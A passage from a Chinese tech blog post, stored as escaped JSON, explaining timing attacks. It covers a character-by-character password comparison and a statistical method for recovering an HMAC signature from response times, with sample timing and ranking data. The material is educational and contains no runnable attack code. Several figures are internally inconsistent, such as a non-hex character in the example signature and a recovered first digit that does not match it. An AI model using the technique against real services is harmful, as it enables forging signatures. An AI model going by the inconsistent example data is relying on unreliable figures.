&#123;            if password[i] != TRUE_PASSWORD[i] &#123;                flag = 0            &#125;        &#125;    if flag&#123;        return true    &#125;else&#123;        return false    &#125;&#125;\n\n对于比这个例子更复杂却存在相同漏洞的算法，我们完全可以使用相同的攻击方式，例如针对HMAC的攻击\n针对HMAC的攻击HMAC，就是客户端向服务端发来一个字符串和其签名字符串（HMAC），然后，服务端的程序用一个私钥来对客户端发来的字符串进行签名得到签名字符串，然后再比较这个签名字符串。而如果这个字符段比对存在上述程序所说的问题，那么攻击者可以在不知道签名算法和私钥，但是知道API的调用接口的情况下，一遍穷举签名，一遍统计调用时间的方式来非常有效的破解签名。例如对于一个签名ddacdffbf0abcddrcdf59ccc19625015b33f55ab,攻击者从0000000000000000000000000000000000000000开始穷举，并得到了穷举第一个字符（从 0 到 f 是因为这是 HMAC 算法的取值范围）的时间统计\n0 0.0054509131 0.0058291982 0.0049054073 0.0052868764 0.0055976115 0.0048144306 0.0049691187 0.0053358848 0.0044331829 0.004440246a 0.004860263b 0.004561121c 0.004463188d 0.004406799e 0.004978907f 0.004887240\n\n原始的数据比较脏，因此我们想要得到得信息并不显著，而我们如果采用这样一个算法，向服务器分别从 0 到 f 发出 16个请求，并记录每个请求的响应时间，并将它们排序 1-16，其实 1 对最慢的请求，16 是最快的请求，分别记录 0-f 的名次，然后重复上述的过程 500 次\n&#123;&quot;0&quot;=&gt;[7, 1, 3, 3, 15, 5, 4, 9, 15, 10, 13, 2, 14, 9, 4, 14, 7, 9, 15, 2, 14, 9, 14, 6, 11...],&quot;1&quot;=&gt;[13, 4, 7, 11, 0, 4, 0, 2, 14, 11, 6, 7, 2, 2, 14, 11, 8, 10, 5, 13, 11, 7, 4, 9, 3...],&quot;2&quot;=&gt;[14, 5, 15, 5, 1, 0, 3, 1, 9, 12, 4, 4, 1, 1, 8, 6, 9, 4, 9, 5, 8, 3, 12, 8, 5...],&quot;3&quot;=&gt;[15, 2, 9, 7, 2, 1, 14, 11, 7, 8, 8, 1, 4, 7, 12, 15, 13, 0, 4, 1, 7, 0, 3, 0, 0...],&quot;4&quot;=&gt;[12, 10, 14, 15, 8, 9, 10, 12, 10, 4, 1, 13, 15, 15, 3, 1, 6, 8, 2, 6, 15, 4, 0, 3, 2...],&quot;5&quot;=&gt;[5, 13, 13, 12, 7, 8, 13, 14, 3, 13, 2, 12, 7, 14, 2, 10, 12, 5, 8, 0, 4, 10, 5, 10, 12...]&quot;6&quot;=&gt;[0, 15, 11, 13, 5, 15, 8, 8, 4, 7, 12, 9, 10, 11, 11, 7, 0, 6, 0, 9, 2, 6, 15, 13, 14...]&quot;7&quot;=&gt;[1, 9, 0, 10, 6, 6, 2, 4, 12, 9, 5, 10, 5, 10, 7, 2, 4, 14, 6, 7, 13, 11, 6, 12, 4...],&quot;8&quot;=&gt;[4, 0, 2, 1, 9, 11, 12, 13, 11, 14, 0, 15, 9, 0, 0, 13, 11, 13, 1, 8, 6, 5, 11, 15, 7...],&quot;9&quot;=&gt;[11, 11, 10, 4, 13, 7, 6, 3, 2, 2, 14, 5, 3, 3, 15, 9, 14, 7, 10, 3, 0, 14, 1, 5, 15...],&quot;a&quot;=&gt;[8, 3, 6, 14, 10, 2, 7, 5, 1, 3, 3, 0, 0, 6, 10, 12, 15, 12, 12, 15, 9, 13, 13, 11, 9...],&quot;b&quot;=&gt;[9, 12, 5, 8, 3, 3, 5, 15, 0, 6, 11, 11, 12, 8, 1, 3, 1, 11, 11, 14, 5, 1, 2, 1, 6...],&quot;c&quot;=&gt;[6, 7, 8, 2, 12, 10, 9, 10, 6, 1, 10, 8, 6, 4, 6, 4, 3, 2, 7, 11, 1, 8, 7, 2, 13...],&quot;d&quot;=&gt;[2, 14, 4, 0, 14, 12, 11, 0, 8, 0, 15, 3, 8, 12, 5, 0, 10, 1, 3, 4, 12, 12, 8, 14, 8...],&quot;e&quot;=&gt;[10, 8, 12, 6, 11, 13, 1, 6, 13, 5, 7, 14, 11, 5, 9, 5, 2, 15, 14, 10, 10, 2, 10, 4, 1...],&quot;f&quot;=&gt;[3, 6, 1, 9, 4, 14, 15, 7, 5, 15, 9, 6, 13, 13, 13, 8, 5, 3, 13, 12, 3, 15, 9, 7, 10...]&#125;\n\n再求每个字符排名的平均值\n&quot;f&quot;, 5.302&quot;0&quot;, 7.17&quot;6&quot;, 7.396&quot;3&quot;, 7.472&quot;5&quot;, 7.562&quot;a&quot;, 7.602&quot;2&quot;, 7.608&quot;8&quot;, 7.626&quot;9&quot;, 7.688&quot;b&quot;, 7.698&quot;1&quot;, 7.704&quot;e&quot;, 7.812&quot;4&quot;, 7.82&quot;d&quot;, 7.826&quot;7&quot;, 7.854&quot;c&quot;, 7.86\n\n这样，第一位是f就显而易见了。然后，再对剩余的 39 个字符重复此算法。这是一种统计技术 ，可让我们从噪声中滤出真实的信号。因此，总共需要调用：16500400 &#x3D; 320，000 个请求，而蛮力穷举需要花费 16^40 个请求，破解效率的提升不言而喻。这样，TimingAttack就实现了\n","categories":["Tech Blog"]}]